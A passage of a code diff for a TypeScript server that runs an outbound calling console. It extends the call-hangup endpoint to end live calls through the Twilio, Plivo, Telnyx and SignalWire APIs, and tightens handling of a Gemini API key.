-  const session = sessions.get(callId);
+  const { callId, customTwilio, carriersConfig = {} } = req.body;
+  const session = getSessionById(callId);
 
   if (!session) {
     return res.status(404).json({ error: 'Call session not found' });
   }
 
   session.status = 'completed';
+  session.pendingDigits = undefined;
+  session.activeCue = undefined;
   session.completedAt = new Date().toISOString();
 
   addSessionEvent(session, {
@@ -1487,17 +1764,59 @@ app.post('/api/call/hangup', async (req: Request, res: Response) => {
     description: 'Operator pressed End Call button in web console.',
   });
 
-  // If live Twilio call, update call status to completed
+  // Terminate live PSTN call on active carrier
   if (!session.isSimulated) {
     try {
-      const accountSid = customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
-      const authToken = customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
-      if (accountSid && authToken && session.id.startsWith('CA')) {
-        const client = twilio(accountSid, authToken);
-        await client.calls(session.id).update({ status: 'completed' });
+      const carrier = session.carrier || 'twilio';
+      const providerSid = session.providerCallSid || session.id;
+      if (carrier === 'twilio') {
+        const accountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
+        const authToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
+        if (accountSid && authToken && providerSid.startsWith('CA')) {
+          const client = twilio(accountSid, authToken);
+          await client.calls(providerSid).update({ status: 'completed' });
+        }
+      } else if (carrier === 'plivo') {
+        const plivoAuthId = carriersConfig.plivo?.authId || process.env.PLIVO_AUTH_ID;
+        const plivoAuthToken = carriersConfig.plivo?.authToken || process.env.PLIVO_AUTH_TOKEN;
+        if (plivoAuthId && plivoAuthToken && !providerSid.startsWith('call_')) {
+          await fetch(`https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/`, {
+            method: 'DELETE',
+            headers: {
+              Authorization: `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`,
+            },
+          });
+        }
+      } else if (carrier === 'telnyx') {
+        const telnyxApiKey = carriersConfig.telnyx?.apiKey || process.env.TELNYX_API_KEY;
+        if (telnyxApiKey && !providerSid.startsWith('call_')) {
+          await fetch(`https://api.telnyx.com/v2/calls/${encodeURIComponent(providerSid)}/actions/hangup`, {
+            method: 'POST',
+            headers: {
+              Authorization: `Bearer ${telnyxApiKey}`,
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({}),
+          });
+        }
+      } else if (carrier === 'signalwire') {
+        const spaceUrl = carriersConfig.signalwire?.spaceUrl || process.env.SIGNALWIRE_SPACE_URL;
+        const projectId = carriersConfig.signalwire?.projectId || process.env.SIGNALWIRE_PROJECT_ID;
+        const apiToken = carriersConfig.signalwire?.apiToken || process.env.SIGNALWIRE_API_TOKEN;
+        if (spaceUrl && projectId && apiToken && !providerSid.startsWith('call_')) {
+          const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
+          await fetch(`https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}.json`, {
+            method: 'POST',
+            headers: {
+              Authorization: `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`,
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({ Status: 'completed' }).toString(),
+          });
+        }
       }
     } catch (err) {
-      console.error('Error hanging up Twilio call:', err);
+      console.error('Error hanging up carrier call:', err);
     }
   }
 
@@ -1508,7 +1827,8 @@ app.post('/api/call/hangup', async (req: Request, res: Response) => {
 app.post('/api/ai/enhance-script', async (req: Request, res: Response) => {
   try {
     const { prompt, useCase = 'appointment' } = req.body;
-    const apiKey = process.env.GEMINI_API_KEY;
+    const rawApiKey = (process.env.GEMINI_API_KEY || '').trim();
+    const apiKey = rawApiKey && rawApiKey !== 'MY_GEMINI_API_KEY' ? rawApiKey : '';
 
     if (!apiKey) {
       return res.status(400).json({
